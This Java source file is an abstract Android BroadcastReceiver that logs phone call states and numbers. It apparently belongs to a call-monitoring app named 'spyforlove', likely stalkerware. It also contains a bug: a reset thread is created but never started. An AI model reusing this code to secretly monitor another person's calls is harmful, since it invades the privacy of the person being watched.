package chem.kth.spyforlove.broadcast;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;

import java.util.Date;

import chem.kth.spyforlove.CallType;
import chem.kth.spyforlove.database.SharePrefUtils;
import chem.kth.spyforlove.model.PhoneCall;


public abstract class PhoneCallReceiver extends BroadcastReceiver {

    private static String lastState = TelephonyManager.EXTRA_STATE_IDLE;
    private static boolean isIncoming;

    @Override
    public void onReceive(Context context, Intent intent) {

        Bundle bundle = intent.getExtras();

        if (bundle.containsKey(TelephonyManager.EXTRA_INCOMING_NUMBER)) {
            String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            String phoneIncomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            String phoneOutgoingNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

            String phoneNumber;
            if (phoneOutgoingNumber == null || phoneOutgoingNumber.isEmpty()) {
                phoneNumber = phoneIncomingNumber;
            } else {
                phoneNumber = phoneOutgoingNumber;
            }

            if (phoneState != null) {
                if (lastState.equals(phoneState)) {
                    return;
                }

                if (TelephonyManager.EXTRA_STATE_RINGING.equals(phoneState)) {
                    isIncoming = true;
                    PhoneCall phoneCall = new PhoneCall(0, phoneNumber, new Date(), new Date(), CallType.Incoming);
                    onIncomingCallRinging(context, phoneCall);
                    SharePrefUtils.getInstance().saveIncomingState(true);
                } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(phoneState)) {
                    if (isIncoming) {
                        if (lastState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                            PhoneCall phoneCall = new PhoneCall(0, phoneNumber, new Date(), new Date(), CallType.MissedCall);
                            onMissedCall(context, phoneCall);
                        } else {
                            PhoneCall phoneCall = new PhoneCall(0, phoneNumber, new Date(), new Date(), CallType.Incoming);
                            onIncomingCallEnded(context, phoneCall);
                        }
                    } else {
                        PhoneCall phoneCall = new PhoneCall(0, phoneNumber, new Date(), new Date(), CallType.Outgoing);
                        onOutgoingCallEnded(context, phoneCall);
                    }
                } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(phoneState)) {
                    isIncoming = lastState.equals(TelephonyManager.EXTRA_STATE_RINGING);
                    if (isIncoming) {
                        onIncomingCallStarted(context, new PhoneCall(0, phoneNumber, new Date(), new Date(), CallType.Incoming));
                        resetIncomingSh();
                    } else {
                        onOutgoingCallStarted(context, new PhoneCall(0, phoneNumber, new Date(), new Date(), CallType.Outgoing));
                    }
                }
                lastState = phoneState;
            }
        }
    }

    private void resetIncomingSh() {
        new Thread(() -> {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            } finally {
                SharePrefUtils.getInstance().saveIncomingState(false);
            }
        });
    }

    protected abstract void onIncomingCallRinging(Context context, PhoneCall phoneCall);

    protected abstract void onIncomingCallStarted(Context context, PhoneCall phoneCall);

    protected abstract void onOutgoingCallStarted(Context ctx, PhoneCall phoneCall);

    protected abstract void onIncomingCallEnded(Context context, PhoneCall phoneCall);

    public abstract void onOutgoingCallAnswered(Context context, PhoneCall phoneCall);

    protected abstract void onOutgoingCallEnded(Context context, PhoneCall phoneCall);

    protected abstract void onMissedCall(Context context, PhoneCall phoneCall);


}

//    List<String> keyList = new ArrayList<>();
//    Bundle bundle = intent.getExtras();
//        if (bundle != null) {
//                keyList = new ArrayList<>(bundle.keySet());
//        }
//
//        if (keyList.contains(TelephonyManager.EXTRA_INCOMING_NUMBER)) {}